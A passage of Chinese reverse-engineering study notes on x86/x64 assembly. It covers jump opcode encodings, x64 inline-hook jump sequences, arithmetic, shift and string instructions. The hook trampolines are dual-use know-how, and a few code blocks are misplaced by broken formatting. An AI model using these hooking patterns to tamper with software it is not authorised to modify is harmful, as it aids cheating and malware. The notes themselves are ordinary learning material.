class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> + <span class="hljs-number">4</span>字节有符号偏移：偏移近跳转<br></code></pre></td></tr></table></figure><p>​<strong>跳转目标地址 &#x3D; 当前指令地址 + 当前指令长度 + 4字节偏移</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FF</span> <span class="hljs-number">25</span> + <span class="hljs-number">4</span>字节：间接跳转<br></code></pre></td></tr></table></figure><ul><li><p>x86：后面跟4字节内存地址。</p><p><strong>跳转目标地址 &#x3D; ptr:[ 4字节内存地址 ]</strong></p></li><li><p>x64：后面跟4字节偏移，再使用偏移计算公式得到4字节内存地址。</p></li></ul><p>​<strong>跳转目标地址 &#x3D; ptr:[ 当前指令地址 + 当前指令长度 + 4字节偏移 ]</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">EA + <span class="hljs-number">4</span>字节地址 + 目标<span class="hljs-built_in">cs</span>：绝对跳转，仅x86有效，可以跳转到绝对地址同时改变<span class="hljs-built_in">cs</span>的值，<span class="hljs-built_in">far</span>常用于实现调用门。<br></code></pre></td></tr></table></figure><p>​<strong>跳转目标地址 &#x3D; 4字节地址、cs &#x3D; 目标cs</strong></p><h3 id="3-4-x64下的Inline-HOOK"><a href="#3-4-x64下的Inline-HOOK" class="headerlink" title="3.4 x64下的Inline HOOK"></a>3.4 x64下的Inline HOOK</h3><p>enter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">方法1：12字节<br>mov rax, 0x123456789<br>jmp rax<br>方法2：12字节<br>mov rax, 0x123456789<br>push rax<br>ret<br>方法3：不破坏寄存器  13字节<br>push rax<br>mov rax, 0x123456789<br>jmp rax<br>```<br>pop rax<br></code></pre></td></tr></table></figure><p>ret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">方法1：20字节<br>sub rsp, 0x8<br>mov dword ptr ss:[rsp], 0x1234<br>mov dword ptr ss:[rsp+0x4], 0x56789ABC<br>ret<br><br>方法2：14字节<br>push 0x12345678<br>mov dword ptr ss:[rsp+4], 0x9ABC<br>ret<br></code></pre></td></tr></table></figure><h2 id="4-基本运算"><a href="#4-基本运算" class="headerlink" title="4.基本运算"></a>4.基本运算</h2><h3 id="4-1-除法"><a href="#4-1-除法" class="headerlink" title="4.1 除法"></a>4.1 除法</h3><p>无符号：div + 除数</p><p>有符号：idiv + 除数，余数的符号与被除数相同。</p><table><thead><tr><th>被除数</th><th>除数</th><th>商</th><th>余数</th></tr></thead><tbody><tr><td>ax</td><td>reg&#x2F;mem8</td><td>al</td><td>ah</td></tr><tr><td>dx:ax</td><td>reg&#x2F;mem16</td><td>ax</td><td>dx</td></tr><tr><td>edx:eax</td><td>reg&#x2F;mem32</td><td>eax</td><td>edx</td></tr><tr><td>rdx:rax</td><td>reg&#x2F;mem64</td><td>rax</td><td>rdx</td></tr></tbody></table><h3 id="4-2-乘法"><a href="#4-2-乘法" class="headerlink" title="4.2 乘法"></a>4.2 乘法</h3><p><strong>单操作数：</strong></p><p>​无符号：mul + 乘数</p><p>​有符号：imul + 乘数</p><table><thead><tr><th>被乘数</th><th>乘数</th><th>乘积</th></tr></thead><tbody><tr><td>al</td><td>reg&#x2F;mem8</td><td>ax</td></tr><tr><td>ax</td><td>reg&#x2F;mem16</td><td>dx:ax</td></tr><tr><td>eax</td><td>reg&#x2F;mem32</td><td>edx:eax</td></tr><tr><td>rax</td><td>reg&#x2F;mem64</td><td>rdx:rax</td></tr></tbody></table><p>对于无符号数，计算后如果dx&#x2F;edx&#x2F;rdx寄存器不为0，则CF位被置位。</p><p>对于有符号数，计算后如果dx&#x2F;edx&#x2F;rdx寄存器不为ax&#x2F;eax&#x2F;rax的符号扩展，则OF和CF位被置位。</p><p><strong>双操作数：</strong>不支持8位，必须是有符号数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul reg1, reg2/mem/imm<br>; 等价形式如下<br>reg1 = reg1 * reg2/mem/imm<br></code></pre></td></tr></table></figure><p><strong>三操作数：</strong>不支持8位，必须是有符号数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul reg1, reg2/mem, imm<br>; 等价形式如下<br>reg1 = reg2/mem * imm<br></code></pre></td></tr></table></figure><h3 id="4-3-移位"><a href="#4-3-移位" class="headerlink" title="4.3 移位"></a>4.3 移位</h3><p><strong>逻辑：</strong>shl、shr</p><p><strong>算数：</strong>sal、sar</p><p>逻辑左移与逻辑左移没区别，算数右移左边补符号位，逻辑右移坐标补0。右移除以2，左移乘以2。</p><h2 id="5-数据传送"><a href="#5-数据传送" class="headerlink" title="5.数据传送"></a>5.数据传送</h2><h3 id="5-1-扩展传送"><a href="#5-1-扩展传送" class="headerlink" title="5.1 扩展传送"></a>5.1 扩展传送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsx：符号位扩展<br>movzx：0扩展<br></code></pre></td></tr></table></figure><h3 id="5-2-隐式传送"><a href="#5-2-隐式传送" class="headerlink" title="5.2 隐式传送"></a>5.2 隐式传送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movs_b/w/d/q<br>; 等价形式如下<br>if(DF == 0); cld<br>&#123;<br>[edi++] = [esi++]<br>&#125;<br>else; std<br>&#123;<br>[edi--] = [esi--]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-3-字符串获取"><a href="#5-3-字符串获取" class="headerlink" title="5.3 字符串获取"></a>5.3 字符串获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lods_b/w/d/q<br>; 等价形式如下<br>if(DF == 0); cld<br>&#123;<br>eax = [esi++]<br>&#125;<br>else; std<br>&#123;<br>eax = [esi--]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-4-字符串加载"><a href="#5-4-字符串加载" class="headerlink" title="5.4 字符串加载"></a>5.4 字符串加载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">stos_b/w/d/q<br>; 等价形式如下<br>if(DF == 0); cld<br>&#123;<br>[edi++] = eax <br>&#125;<br>else; std<br>&#123;<br>[edi--] = eax <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> x86/x64 asm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
